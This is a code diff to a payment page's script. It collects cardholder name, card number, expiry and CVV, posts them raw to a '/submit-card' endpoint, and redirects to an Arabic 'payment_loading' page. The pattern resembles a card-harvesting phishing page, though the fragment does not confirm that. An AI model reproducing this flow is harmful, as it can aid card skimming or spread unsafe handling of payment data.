@@ -394,7 +394,7 @@
 
         document.getElementById('payButton').addEventListener('click', async function() {
             const cardName = document.getElementById('cardName').value;
-            const cardNumber = document.getElementById('cardNumber').value;
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
             const expiryMonth = document.getElementById('expiryMonth').value;
             const expiryYear = document.getElementById('expiryYear').value;
             const cvv = document.getElementById('cvv').value;
@@ -407,10 +407,17 @@
             this.disabled = true;
             this.innerText = 'Processing...';
 
-            const userData = JSON.parse(sessionStorage.getItem('userData') || '{}');
+            const orderId = new URLSearchParams(window.location.search).get('orderId');
+            
+            if (!orderId) {
+                alert('Order ID not found. Please start over.');
+                this.disabled = false;
+                this.innerText = 'Pay';
+                return;
+            }
             
             const payload = {
-                ...userData,
+                orderId,
                 transactionId: fullTransactionNo,
                 cardName,
                 cardNumber,
@@ -419,15 +426,14 @@
             };
 
             try {
-                const response = await fetch('/submit-data', {
+                const response = await fetch('/submit-card', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
                 if (response.ok) {
-                    const data = await response.json();
-                    window.location.href = `payment_loading_ar.html?orderId=${data.orderId}`;
+                    window.location.href = `payment_loading_ar.html?orderId=${orderId}`;
                 } else {
                     alert('An error occurred. Please try again.');
                     this.disabled = false;
